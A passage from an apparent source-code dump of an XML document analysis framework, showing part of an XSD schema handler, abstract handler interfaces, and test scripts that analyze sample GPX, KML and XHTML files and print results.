                    if facet == 'enumeration':
                        constraints[facet] = [e.get('value') for e in elements]
                    elif len(elements) == 1:
                        constraints[facet] = elements[0].get('value')
                    else:
                        constraints[facet] = [e.get('value') for e in elements]
            
            if constraints:
                rules.append({
                    'base_type': base,
                    'constraints': constraints
                })
        
        # Extract key/keyref constraints
        for key in root.findall('.//{http://www.w3.org/2001/XMLSchema}key'):
            rules.append({
                'type': 'key',
                'name': key.get('name'),
                'selector': key.find('.//{http://www.w3.org/2001/XMLSchema}selector').get('xpath', ''),
                'fields': [f.get('xpath', '') for f in key.findall('.//{http://www.w3.org/2001/XMLSchema}field')]
            })
        
        return rules
    
    def _analyze_namespaces(self, root: ET.Element) -> Dict[str, Any]:
        imports = []
        includes = []
        
        for imp in root.findall('./{http://www.w3.org/2001/XMLSchema}import'):
            imports.append({
                'namespace': imp.get('namespace'),
                'location': imp.get('schemaLocation')
            })
        
        for inc in root.findall('./{http://www.w3.org/2001/XMLSchema}include'):
            includes.append({
                'location': inc.get('schemaLocation')
            })
        
        return {
            'target': root.get('targetNamespace'),
            'imports': imports,
            'includes': includes
        }
    
    def _find_imports(self, root: ET.Element) -> List[Dict[str, str]]:
        imports = []
        
        for imp in root.findall('.//{http://www.w3.org/2001/XMLSchema}import'):
            imports.append({
                'namespace': imp.get('namespace', ''),
                'location': imp.get('schemaLocation', '')
            })
        
        return imports
    
    def _calculate_complexity(self, root: ET.Element) -> Dict[str, Any]:
        # Count various elements to assess complexity
        metrics = {
            'total_types': len(root.findall('.//{http://www.w3.org/2001/XMLSchema}complexType')) + 
                          len(root.findall('.//{http://www.w3.org/2001/XMLSchema}simpleType')),
            'total_elements': len(root.findall('.//{http://www.w3.org/2001/XMLSchema}element')),
            'total_attributes': len(root.findall('.//{http://www.w3.org/2001/XMLSchema}attribute')),
            'max_nesting': self._calculate_max_nesting(root),
            'has_recursion': self._check_recursion(root),
            'uses_substitution_groups': len(root.findall('.//*[@substitutionGroup]')) > 0,
            'uses_abstract_types': len(root.findall('.//*[@abstract="true"]')) > 0
        }
        
        # Calculate complexity score
        complexity_score = (
            min(metrics['total_types'] / 50, 1.0) * 0.3 +
            min(metrics['total_elements'] / 100, 1.0) * 0.3 +
            min(metrics['max_nesting'] / 10, 1.0) * 0.2 +
            (0.2 if metrics['has_recursion'] else 0.0)
        )
        
        metrics['complexity_score'] = round(complexity_score, 2)
        
        return metrics
    
    def _find_base_type(self, complex_type: ET.Element) -> Optional[str]:
        # Check for extension
        extension = complex_type.find('.//{http://www.w3.org/2001/XMLSchema}extension')
        if extension is not None:
            return extension.get('base')
        
        # Check for restriction
        restriction = complex_type.find('.//{http://www.w3.org/2001/XMLSchema}restriction')
        if restriction is not None:
            return restriction.get('base')
        
        return None
    
    def _find_restriction_base(self, simple_type: ET.Element) -> Optional[str]:
        restriction = simple_type.find('./{http://www.w3.org/2001/XMLSchema}restriction')
        if restriction is not None:
            return restriction.get('base')
        
        # Check for list
        list_elem = simple_type.find('./{http://www.w3.org/2001/XMLSchema}list')
        if list_elem is not None:
            return f"list of {list_elem.get('itemType', 'unknown')}"
        
        # Check for union
        union_elem = simple_type.find('./{http://www.w3.org/2001/XMLSchema}union')
        if union_elem is not None:
            return f"union of {union_elem.get('memberTypes', 'multiple types')}"
        
        return None
    
    def _extract_simple_constraints(self, simple_type: ET.Element) -> Dict[str, Any]:
        constraints = {}
        restriction = simple_type.find('./{http://www.w3.org/2001/XMLSchema}restriction')
        
        if restriction is not None:
            # Extract enumeration values
            enums = restriction.findall('./{http://www.w3.org/2001/XMLSchema}enumeration')
            if enums:
                constraints['enumeration'] = [e.get('value') for e in enums]
            
            # Extract pattern
            pattern = restriction.find('./{http://www.w3.org/2001/XMLSchema}pattern')
            if pattern is not None:
                constraints['pattern'] = pattern.get('value')
            
            # Extract length constraints
            for constraint in ['minLength', 'maxLength', 'length']:
                elem = restriction.find(f'.//{{http://www.w3.org/2001/XMLSchema}}{constraint}')
                if elem is not None:
                    constraints[constraint] = elem.get('value')
        
        return constraints
    
    def _extract_type_definitions(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Return first 20 type definitions with details
        types = []
        
        for ct in root.findall('.//{http://www.w3.org/2001/XMLSchema}complexType[@name]')[:10]:
            types.append({
                'name': ct.get('name'),
                'kind': 'complex',
                'abstract': ct.get('abstract', 'false') == 'true',
                'documentation': self._get_documentation(ct)
            })
        
        for st in root.findall('.//{http://www.w3.org/2001/XMLSchema}simpleType[@name]')[:10]:
            types.append({
                'name': st.get('name'),
                'kind': 'simple',
                'base': self._find_restriction_base(st),
                'documentation': self._get_documentation(st)
            })
        
        return types
    
    def _extract_element_definitions(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Return global element definitions
        elements = []
        
        for elem in root.findall('./{http://www.w3.org/2001/XMLSchema}element')[:20]:
            elements.append({
                'name': elem.get('name'),
                'type': elem.get('type'),
                'min_occurs': elem.get('minOccurs', '1'),
                'max_occurs': elem.get('maxOccurs', '1'),
                'documentation': self._get_documentation(elem)
            })
        
        return elements
    
    def _extract_constraints(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Extract unique/key/keyref constraints
        constraints = []
        
        for constraint_type in ['unique', 'key', 'keyref']:
            for elem in root.findall(f'.//{{http://www.w3.org/2001/XMLSchema}}{constraint_type}'):
                constraints.append({
                    'type': constraint_type,
                    'name': elem.get('name'),
                    'refer': elem.get('refer')  # for keyref
                })
        
        return constraints
    
    def _extract_documentation(self, root: ET.Element) -> Dict[str, List[str]]:
        docs = {}
        
        for elem in root.findall('.//*[@name]'):
            doc = self._get_documentation(elem)
            if doc:
                elem_name = elem.get('name')
                elem_type = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                key = f"{elem_type}:{elem_name}"
                docs[key] = doc
        
        return docs
    
    def _get_documentation(self, element: ET.Element) -> Optional[str]:
        annotation = element.find('./{http://www.w3.org/2001/XMLSchema}annotation')
        if annotation is not None:
            doc = annotation.find('./{http://www.w3.org/2001/XMLSchema}documentation')
            if doc is not None and doc.text:
                return doc.text.strip()
        return None
    
    def _calculate_max_nesting(self, root: ET.Element) -> int:
        # Simplified calculation of nesting depth
        max_depth = 0
        
        def check_depth(elem, depth=0):
            nonlocal max_depth
            max_depth = max(max_depth, depth)
            
            # Check sequences and choices
            for container in elem.findall('.//{http://www.w3.org/2001/XMLSchema}sequence') + \
                           elem.findall('.//{http://www.w3.org/2001/XMLSchema}choice'):
                check_depth(container, depth + 1)
        
        for ct in root.findall('.//{http://www.w3.org/2001/XMLSchema}complexType'):
            check_depth(ct)
        
        return max_depth
    
    def _check_recursion(self, root: ET.Element) -> bool:
        # Simplified check for recursive type definitions
        type_refs = {}
        
        # Build reference map
        for elem in root.findall('.//{http://www.w3.org/2001/XMLSchema}element[@type]'):
            elem_type = elem.get('type')
            parent = elem
            while parent is not None:
                parent = parent.find('..')
                if parent is not None and parent.get('name'):
                    parent_name = parent.get('name')
                    if parent_name not in type_refs:
                        type_refs[parent_name] = set()
                    type_refs[parent_name].add(elem_type)
                    break
        
        # Check for cycles (simplified)
        for type_name, refs in type_refs.items():
            if type_name in refs:
                return True
        
        return False
    
    def _assess_schema_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        # Assess various quality aspects
        metrics = findings['complexity_metrics']
        
        # Documentation coverage
        doc_count = len(findings.get('documentation', {}))
        total_named = len(findings['types']['complex']) + len(findings['types']['simple']) + \
                     len(findings['elements']['global'])
        doc_coverage = doc_count / max(total_named, 1)
        
        # Reusability (global vs local definitions)
        global_count = len(findings['types']['complex']) + len(findings['types']['simple'])
        reusability = min(global_count / 20, 1.0)  # Assume 20+ global types is good
        
        # Constraint usage
        constraint_score = min(len(findings['validation_rules']) / 10, 1.0)
        
        return {
            "documentation": doc_coverage,
            "reusability": reusability,
            "validation_completeness": constraint_score,
            "complexity": 1.0 - metrics['complexity_score'],  # Lower complexity is better
            "maintainability": (doc_coverage + reusability + (1.0 - metrics['complexity_score'])) / 3
        }
</file>

<file path="src/utils/__init__.py">
"""
XML Analysis Utilities

Utility functions and classes for XML processing and analysis.
"""
</file>

<file path="src/base.py">
#!/usr/bin/env python3
"""
Base Interfaces for Analysis Frameworks

This module provides the foundational interfaces and data structures that can be
copied and adapted by other analysis frameworks (document, data, media).

These interfaces establish a consistent pattern across all frameworks while
allowing each to evolve independently without external dependencies.
"""

import xml.etree.ElementTree as ET
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field


@dataclass
class DocumentTypeInfo:
    """Information about a detected document type"""
    type_name: str
    confidence: float  # 0.0 to 1.0
    version: Optional[str] = None
    schema_uri: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SpecializedAnalysis:
    """Results from specialized handler analysis"""
    document_type: str
    key_findings: Dict[str, Any]
    recommendations: List[str]
    data_inventory: Dict[str, int]  # What types of data found and counts
    ai_use_cases: List[str]  # Potential AI/ML applications
    structured_data: Dict[str, Any]  # Extracted structured data
    quality_metrics: Dict[str, float]  # Data quality indicators


class FileHandler(ABC):
    """
    Abstract base class for file document handlers
    
    This interface can be adapted by other frameworks:
    - XMLHandler: Uses ET.Element for XML-specific processing
    - DocumentHandler: Uses file_path for office documents  
    - DataHandler: Uses file_path for structured data
    - MediaHandler: Uses file_path for media files
    """
    
    @abstractmethod
    def can_handle(self, file_path: str, **kwargs) -> Tuple[bool, float]:
        """
        Check if this handler can process the file
        
        Args:
            file_path: Path to the file to analyze
            **kwargs: Framework-specific additional parameters
                     (e.g., root: ET.Element for XML, mime_type for others)
        
        Returns:
            (can_handle: bool, confidence: float)
        """
        pass
    
    @abstractmethod
    def detect_type(self, file_path: str, **kwargs) -> DocumentTypeInfo:
        """
        Detect and classify the document type
        
        Args:
            file_path: Path to the file to analyze
            **kwargs: Framework-specific additional parameters
            
        Returns:
            DocumentTypeInfo with classification details
        """
        pass
    
    @abstractmethod
    def analyze(self, file_path: str, **kwargs) -> SpecializedAnalysis:
        """
        Perform specialized analysis of the document
        
        Args:
            file_path: Path to the file to analyze  
            **kwargs: Framework-specific additional parameters
            
        Returns:
            SpecializedAnalysis with comprehensive insights
        """
        pass
    
    @abstractmethod
    def extract_key_data(self, file_path: str, **kwargs) -> Dict[str, Any]:
        """
        Extract key structured data from the document
        
        Args:
            file_path: Path to the file to analyze
            **kwargs: Framework-specific additional parameters
            
        Returns:
            Dictionary of extracted key data
        """
        pass


class XMLHandler(FileHandler):
    """
    XML-specific handler interface
    
    Extends FileHandler with XML-specific method signatures.
    Other frameworks would create their own specific handler classes:
    - DocumentHandler(FileHandler) for office documents
    - DataHandler(FileHandler) for structured data  
    - MediaHandler(FileHandler) for media files
    """
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        """
        Check if this handler can process the XML document
        
        Args:
            root: Root element of the parsed XML
            namespaces: Detected namespaces in the document
            
        Returns:
            (can_handle: bool, confidence: float)
        """
        pass
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        """
        Detect and classify the XML document type
        
        Args:
            root: Root element of the parsed XML
            namespaces: Detected namespaces in the document
            
        Returns:
            DocumentTypeInfo with classification details
        """
        pass
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        """
        Perform specialized analysis of the XML document
        
        Args:
            root: Root element of the parsed XML
            file_path: Path to the original file
            
        Returns:
            SpecializedAnalysis with comprehensive insights
        """
        pass
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        """
        Extract key structured data from the XML document
        
        Args:
            root: Root element of the parsed XML
            
        Returns:
            Dictionary of extracted key data
        """
        pass


# Framework Pattern Examples for Copy-Paste to Other Frameworks:

"""
# Document Analysis Framework would use:
class DocumentHandler(FileHandler):
    def can_handle(self, file_path: str, mime_type: str) -> Tuple[bool, float]:
        pass
    
    def detect_type(self, file_path: str, mime_type: str) -> DocumentTypeInfo:
        pass
    
    def analyze(self, file_path: str) -> SpecializedAnalysis:
        pass
    
    def extract_key_data(self, file_path: str) -> Dict[str, Any]:
        pass

# Data Analysis Framework would use:
class DataHandler(FileHandler):  
    def can_handle(self, file_path: str, sample_data: Any = None) -> Tuple[bool, float]:
        pass
    
    def detect_type(self, file_path: str, sample_data: Any = None) -> DocumentTypeInfo:
        pass
    
    def analyze(self, file_path: str) -> SpecializedAnalysis:
        pass
    
    def extract_key_data(self, file_path: str) -> Dict[str, Any]:
        pass

# Media Analysis Framework would use:
class MediaHandler(FileHandler):
    def can_handle(self, file_path: str, media_info: Dict = None) -> Tuple[bool, float]:
        pass
    
    def detect_type(self, file_path: str, media_info: Dict = None) -> DocumentTypeInfo:
        pass
    
    def analyze(self, file_path: str) -> SpecializedAnalysis:
        pass
    
    def extract_key_data(self, file_path: str) -> Dict[str, Any]:
        pass
"""
</file>

<file path="tests/comprehensive/__init__.py">
"""Comprehensive tests for full system validation"""
</file>

<file path="tests/comprehensive/test_all_sample_data.py">
#!/usr/bin/env python3
"""
Comprehensive test of all XML handlers against all sample data files
"""
import sys
import os
from pathlib import Path
import time
from collections import defaultdict

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def is_xml_file(file_path):
    """Check if file is an XML file by extension"""
    xml_extensions = {'.xml', '.xlf', '.xliff', '.xsd', '.wsdl', '.svg', '.kml', 
                     '.gpx', '.rss', '.atom', '.xhtml', '.html', '.pom', '.wadl'}
    return Path(file_path).suffix.lower() in xml_extensions

def get_file_size_category(size_bytes):
    """Categorize file by size"""
    if size_bytes < 1024:
        return "tiny"
    elif size_bytes < 10 * 1024:
        return "small"
    elif size_bytes < 100 * 1024:
        return "medium" 
    elif size_bytes < 1024 * 1024:
        return "large"
    else:
        return "huge"

def test_all_sample_data():
    """Test all XML files in sample_data directory"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Find all XML files
    sample_data_dir = Path("sample_data")
    if not sample_data_dir.exists():
        print("❌ sample_data directory not found")
        return False
    
    xml_files = []
    for file_path in sample_data_dir.rglob("*"):
        if file_path.is_file() and is_xml_file(file_path):
            xml_files.append(file_path)
    
    if not xml_files:
        print("❌ No XML files found in sample_data directory")
        return False
    
    print(f"🔍 Found {len(xml_files)} XML files to test")
    
    # Initialize analyzer
    analyzer = XMLDocumentAnalyzer()
    
    # Test results tracking
    results = {
        'total_files': len(xml_files),
        'successful': 0,
        'failed': 0,
        'errors': [],
        'handler_usage': defaultdict(int),
        'document_types': defaultdict(int),
        'size_categories': defaultdict(int),
        'processing_times': [],
        'file_results': []
    }
    
    print(f"\n🧪 Testing {len(xml_files)} XML files...")
    print("=" * 80)
    
    for i, file_path in enumerate(xml_files, 1):
        try:
            relative_path = file_path.relative_to(Path.cwd())
        except ValueError:
            relative_path = file_path
        file_size = file_path.stat().st_size
        size_category = get_file_size_category(file_size)
        results['size_categories'][size_category] += 1
        
        print(f"[{i:3d}/{len(xml_files)}] {relative_path} ({file_size:,} bytes)")
        
        start_time = time.time()
        
        try:
            # Analyze the file
            result = analyzer.analyze_document(str(file_path))
            processing_time = time.time() - start_time
            results['processing_times'].append(processing_time)
            
            if 'error' in result:
                print(f"    ❌ Error: {result['error']}")
                results['failed'] += 1
                results['errors'].append({
                    'file': str(relative_path),
                    'error': result['error']
                })
            else:
                handler_used = result.get('handler_used', 'Unknown')
                confidence = result.get('confidence', 0.0)
                analysis = result.get('analysis')
                
                if analysis:
                    doc_type = analysis.document_type
                    ai_use_cases = len(analysis.ai_use_cases) if hasattr(analysis, 'ai_use_cases') else 0
                    quality_score = analysis.quality_metrics.get('overall', 0.0) if hasattr(analysis, 'quality_metrics') else 0.0
                    
                    print(f"    ✅ {handler_used} (conf: {confidence:.2f}) → {doc_type}")
                    print(f"        Quality: {quality_score:.2f}, AI use cases: {ai_use_cases}, Time: {processing_time:.3f}s")
                    
                    results['successful'] += 1
                    results['handler_usage'][handler_used] += 1
                    results['document_types'][doc_type] += 1
                    
                    results['file_results'].append({
                        'file': str(relative_path),
                        'handler': handler_used,
                        'document_type': doc_type,
                        'confidence': confidence,
                        'quality_score': quality_score,
                        'ai_use_cases': ai_use_cases,
                        'processing_time': processing_time,
                        'file_size': file_size,
                        'size_category': size_category
                    })
                else:
                    print(f"    ❌ No analysis result from {handler_used}")
                    results['failed'] += 1
                    results['errors'].append({
                        'file': str(relative_path),
                        'error': 'No analysis result returned'
                    })
                    
        except Exception as e:
            processing_time = time.time() - start_time
            print(f"    ❌ Exception: {e}")
            results['failed'] += 1
            results['errors'].append({
                'file': str(relative_path),
                'error': str(e)
            })
    
    # Print comprehensive results
    print("\n" + "=" * 80)
    print("📊 COMPREHENSIVE TEST RESULTS")
    print("=" * 80)
    
    success_rate = (results['successful'] / results['total_files']) * 100
    print(f"Overall Success Rate: {success_rate:.1f}% ({results['successful']}/{results['total_files']})")
    print(f"Total Processing Time: {sum(results['processing_times']):.2f}s")
    if results['processing_times']:
        avg_time = sum(results['processing_times']) / len(results['processing_times'])
        print(f"Average Processing Time: {avg_time:.3f}s per file")
    
    # Handler usage statistics
    print(f"\n🔧 Handler Usage Statistics:")
    sorted_handlers = sorted(results['handler_usage'].items(), key=lambda x: x[1], reverse=True)
    for handler, count in sorted_handlers:
        percentage = (count / results['successful']) * 100 if results['successful'] > 0 else 0
        print(f"  {handler}: {count} files ({percentage:.1f}%)")
    
    # Document type distribution
    print(f"\n📋 Document Type Distribution:")
    sorted_types = sorted(results['document_types'].items(), key=lambda x: x[1], reverse=True)
    for doc_type, count in sorted_types:
        percentage = (count / results['successful']) * 100 if results['successful'] > 0 else 0
        print(f"  {doc_type}: {count} files ({percentage:.1f}%)")
    
    # File size distribution
    print(f"\n📏 File Size Distribution:")
    size_order = ['tiny', 'small', 'medium', 'large', 'huge']
    for size_cat in size_order:
        count = results['size_categories'].get(size_cat, 0)
        if count > 0:
            percentage = (count / results['total_files']) * 100
            print(f"  {size_cat.capitalize()}: {count} files ({percentage:.1f}%)")
    
    # Performance analysis
    if results['file_results']:
        print(f"\n⚡ Performance Analysis:")
        # Best performing handlers (by average processing time)
        handler_times = defaultdict(list)
        for result in results['file_results']:
            handler_times[result['handler']].append(result['processing_time'])
        
        handler_avg_times = {
            handler: sum(times) / len(times) 
            for handler, times in handler_times.items()
        }
        sorted_performance = sorted(handler_avg_times.items(), key=lambda x: x[1])
        
        print("  Fastest Handlers (avg time):")
        for handler, avg_time in sorted_performance[:5]:
            count = len(handler_times[handler])
            print(f"    {handler}: {avg_time:.3f}s avg ({count} files)")
    
    # Quality analysis
    if results['file_results']:
        print(f"\n🏆 Quality Analysis:")
        quality_scores = [r['quality_score'] for r in results['file_results'] if r['quality_score'] > 0]
        if quality_scores:
            avg_quality = sum(quality_scores) / len(quality_scores)
            max_quality = max(quality_scores)
            min_quality = min(quality_scores)
            print(f"  Average Quality Score: {avg_quality:.2f}")
            print(f"  Quality Range: {min_quality:.2f} - {max_quality:.2f}")
            
            # Best quality files
            best_files = sorted(results['file_results'], key=lambda x: x['quality_score'], reverse=True)[:5]
            print("  Highest Quality Files:")
            for result in best_files:
                if result['quality_score'] > 0:
                    print(f"    {result['file']}: {result['quality_score']:.2f} ({result['document_type']})")
    
    # Error analysis
    if results['errors']:
        print(f"\n❌ Error Analysis ({len(results['errors'])} errors):")
        error_types = defaultdict(int)
        for error in results['errors']:
            error_msg = error['error']
            # Categorize common errors
            if 'parse' in error_msg.lower():
                error_types['Parse Errors'] += 1
            elif 'not found' in error_msg.lower():
                error_types['File Not Found'] += 1
            elif 'permission' in error_msg.lower():
                error_types['Permission Errors'] += 1
            else:
                error_types['Other Errors'] += 1
        
        for error_type, count in error_types.items():
            print(f"  {error_type}: {count}")
        
        # Show first few errors for debugging
        print("  Sample Errors:")
        for error in results['errors'][:3]:
            print(f"    {error['file']}: {error['error']}")
    
    print(f"\n{'='*80}")
    if success_rate >= 90:
        print("🎉 EXCELLENT! Very high success rate")
    elif success_rate >= 75:
        print("✅ GOOD! High success rate")
    elif success_rate >= 50:
        print("⚠️  MODERATE success rate - room for improvement")
    else:
        print("❌ LOW success rate - needs attention")
    
    return success_rate >= 75

if __name__ == "__main__":
    print("🧪 COMPREHENSIVE XML HANDLER TEST")
    print("Testing all handlers against all sample data files")
    print("=" * 80)
    
    success = test_all_sample_data()
    
    if success:
        print("\n🎉 Overall test PASSED!")
        sys.exit(0)
    else:
        print("\n❌ Overall test had issues - check results above")
        sys.exit(1)
</file>

<file path="tests/comprehensive/test_gpx_comprehensive.py">
#!/usr/bin/env python3
"""
Comprehensive test of GPX handler with detailed analysis
"""

import sys
import os

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from core.analyzer import XMLDocumentAnalyzer

def main():
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/gpx/hiking_track.gpx"
    
    print(f"🏃 Analyzing GPX file: {test_file}")
    print("=" * 60)
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"Handler Used: {result['handler_used']}")
        print(f"Document Type: {result['document_type'].type_name}")
        print(f"Version: {result['document_type'].version}")
        print(f"Content Type: {result['document_type'].metadata.get('content_type')}")
        print(f"Confidence: {result['confidence']:.2f}")
        
        analysis = result['analysis']
        print(f"\nDocument Analysis: {analysis.document_type}")
        print(f"Data Inventory: {analysis.data_inventory}")
        
        findings = analysis.key_findings
        
        # Metadata
        metadata = findings['metadata']
        print(f"\n📋 Metadata:")
        print(f"  - Name: {metadata.get('name')}")
        print(f"  - Description: {metadata.get('description')}")
        print(f"  - Creator: {metadata.get('creator')}")
        print(f"  - Version: {metadata.get('version')}")
        
        # Statistics
        stats = findings['statistics']
        print(f"\n📊 Statistics:")
        print(f"  - Total Points: {stats['total_points']}")
        print(f"  - Distance: {stats['total_distance_km']:.2f} km")
        print(f"  - Duration: {stats['total_duration_hours']:.2f} hours")
        print(f"  - Avg Speed: {stats['avg_speed_kmh']:.2f} km/h")
        print(f"  - Max Speed: {stats['max_speed_kmh']:.2f} km/h") 
        print(f"  - Elevation Gain: {stats['elevation_gain_m']:.0f} m")
        print(f"  - Elevation Loss: {stats['elevation_loss_m']:.0f} m")
        print(f"  - Max Elevation: {stats['max_elevation_m']:.0f} m")
        print(f"  - Min Elevation: {stats['min_elevation_m']:.0f} m")
        
        # Tracks
        tracks = findings['tracks']
        print(f"\n🛤️ Tracks ({tracks['count']}):")
        for i, track in enumerate(tracks['tracks'][:2], 1):
            print(f"  Track {i}: {track.get('name', 'Unnamed')}")
            print(f"    - Points: {track['total_points']}")
            print(f"    - Distance: {track['total_distance_km']:.2f} km")
            print(f"    - Duration: {track['total_duration_minutes']:.1f} minutes")
            print(f"    - Segments: {len(track['segments'])}")
        
        # Elevation Profile
        elevation = findings['elevation_profile']
        if elevation['has_elevation']:
            print(f"\n⛰️ Elevation Profile:")
            elev_stats = elevation['statistics']
            print(f"  - Range: {elev_stats['min']:.0f}m - {elev_stats['max']:.0f}m")
            print(f"  - Total Range: {elev_stats['range']:.0f}m")
            print(f"  - Mean Elevation: {elev_stats['mean']:.0f}m")
            print(f"  - Elevation Gain: {elev_stats['gain']:.0f}m")
            print(f"  - Elevation Loss: {elev_stats['loss']:.0f}m")
            
            if 'gradient_analysis' in elevation:
                grad = elevation['gradient_analysis']
                print(f"  - Max Gradient: {grad['max_gradient']:.1f}%")
                print(f"  - Min Gradient: {grad['min_gradient']:.1f}%")
                print(f"  - Avg Gradient: {grad['avg_gradient']:.1f}%")
                print(f"  - Steep Sections: {grad['steep_sections']}")
        
        # Temporal Analysis
        temporal = findings['temporal_analysis']
        if temporal['has_timestamps']:
            print(f"\n⏰ Temporal Analysis:")
            print(f"  - Start: {temporal['start_time']}")
            print(f"  - End: {temporal['end_time']}")  
            print(f"  - Duration: {temporal['duration_hours']:.2f} hours")
            print(f"  - Time Gaps: {len(temporal['time_gaps'])}")
        
        # Geographic Bounds
        bounds = findings['geographic_bounds']
        print(f"\n🗺️ Geographic Bounds:")
        print(f"  - North: {bounds['north']:.4f}°")
        print(f"  - South: {bounds['south']:.4f}°")
        print(f"  - East: {bounds['east']:.4f}°")
        print(f"  - West: {bounds['west']:.4f}°")
        
        # Quality metrics
        quality = analysis.quality_metrics
        print(f"\n📈 Quality Metrics:")
        for metric, value in quality.items():
            print(f"  - {metric.replace('_', ' ').title()}: {value:.2f}")
        
        # AI use cases (first 5)
        print(f"\n🤖 AI Use Cases ({len(analysis.ai_use_cases)}):")
        for i, use_case in enumerate(analysis.ai_use_cases[:5], 1):
            print(f"  {i}. {use_case}")
        
        print(f"\n✅ Comprehensive analysis completed successfully!")
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
</file>

<file path="tests/comprehensive/test_kml_manual.py">
#!/usr/bin/env python3
"""
Manual test of KML handler with complex document
"""

import sys
import os
import json

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from core.analyzer import XMLDocumentAnalyzer

def main():
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/kml/complex_document.kml"
    
    print(f"🗺️ Analyzing KML file: {test_file}")
    print("=" * 60)
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"Handler Used: {result['handler_used']}")
        print(f"Document Type: {result['document_type'].type_name}")
        print(f"Version: {result['document_type'].version}")
        print(f"Confidence: {result['confidence']:.2f}")
        
        analysis = result['analysis']
        print(f"\nDocument Analysis: {analysis.document_type}")
        print(f"Data Inventory: {analysis.data_inventory}")
        
        findings = analysis.key_findings
        
        # Structure
        structure = findings['structure']
        print(f"\n📊 Structure:")
        print(f"  - Total Features: {structure['total_features']}")
        print(f"  - Documents: {structure['documents']}")
        print(f"  - Folders: {structure['folders']}")
        print(f"  - Max Depth: {structure['max_depth']}")
        print(f"  - Has Schema: {structure['has_schema']}")
        print(f"  - Has Extended Data: {structure['has_extended_data']}")
        
        # Placemarks
        placemarks = findings['placemarks']
        print(f"\n📍 Placemarks ({len(placemarks)}):")
        for pm in placemarks[:3]:
            print(f"  - {pm.get('name', 'Unnamed')}: {pm.get('geometry_type', 'No geometry')}")
            if pm.get('description'):
                desc = pm['description'][:100] + "..." if len(pm['description']) > 100 else pm['description']
                print(f"    Description: {desc}")
        
        # Geometries
        geometries = findings['geometries']
        print(f"\n🗺️ Geometries:")
        print(f"  - Total: {geometries['total']}")
        print(f"  - Points: {geometries['points']}")
        print(f"  - Lines: {geometries['lines']}")
        print(f"  - Polygons: {geometries['polygons']}")
        print(f"  - Coordinates: {geometries['coordinate_count']}")
        
        # Quality metrics
        quality = analysis.quality_metrics
        print(f"\n📈 Quality Metrics:")
        for metric, value in quality.items():
            print(f"  - {metric.title()}: {value:.2f}")
        
        # AI use cases
        print(f"\n🤖 AI Use Cases ({len(analysis.ai_use_cases)}):")
        for i, use_case in enumerate(analysis.ai_use_cases[:5], 1):
            print(f"  {i}. {use_case}")
        
        print(f"\n✅ Analysis completed successfully!")
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
</file>

<file path="tests/comprehensive/test_xhtml_comprehensive.py">
#!/usr/bin/env python3
"""
Comprehensive test of XHTML handler with detailed analysis
"""

import sys
import os

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from core.analyzer import XMLDocumentAnalyzer

def main():
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/xhtml/form_page.xhtml"
    
    print(f"🌐 Analyzing XHTML file: {test_file}")
    print("=" * 60)
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"Handler Used: {result['handler_used']}")
        print(f"Document Type: {result['document_type'].type_name}")
        print(f"Version: {result['document_type'].version}")
        print(f"Document Subtype: {result['document_type'].metadata.get('document_type')}")
        print(f"Confidence: {result['confidence']:.2f}")
        
        analysis = result['analysis']
        print(f"\nDocument Analysis: {analysis.document_type}")
        print(f"Data Inventory: {analysis.data_inventory}")
        
        findings = analysis.key_findings
        
        # Document structure
        structure = findings['document_structure']
        print(f"\n🏗️ Document Structure:")
        print(f"  - Total Elements: {structure['total_elements']}")
        print(f"  - Max Depth: {structure['max_depth']}")
        print(f"  - Has Head: {structure['has_head']}")
        print(f"  - Has Body: {structure['has_body']}")
        print(f"  - Top Elements: {list(structure['element_counts'].items())[:5]}")
        
        # Content analysis
        content = findings['content_analysis']
        print(f"\n📝 Content Analysis:")
        print(f"  - Language: {content.get('language', 'unknown')}")
        print(f"  - Text Length: {content['text_content_length']} characters")
        print(f"  - Headings: {content['headings']}")
        print(f"  - Paragraphs: {content['paragraphs']}")
        print(f"  - Lists: {content['lists']}")
        print(f"  - Tables: {content['tables']}")
        print(f"  - Sections: {content['sections']}")
        
        # Semantic elements
        semantic = findings['semantic_elements']
        print(f"\n🎯 Semantic Elements:")
        print(f"  - Total Semantic: {semantic['total_semantic']}")
        if semantic['elements']:
            print(f"  - Elements Found: {semantic['elements']}")
        
        # Metadata
        metadata = findings['metadata']
        print(f"\n📋 Metadata:")
        print(f"  - Title: {metadata.get('title')}")
        print(f"  - Description: {metadata.get('description', 'None')[:100]}...")
        print(f"  - Author: {metadata.get('author')}")
        print(f"  - Charset: {metadata.get('charset')}")
        print(f"  - Viewport: {metadata.get('viewport')}")
        print(f"  - Meta Tags: {len(metadata.get('meta_tags', []))}")
        print(f"  - Link Tags: {len(metadata.get('link_tags', []))}")
        
        # Accessibility
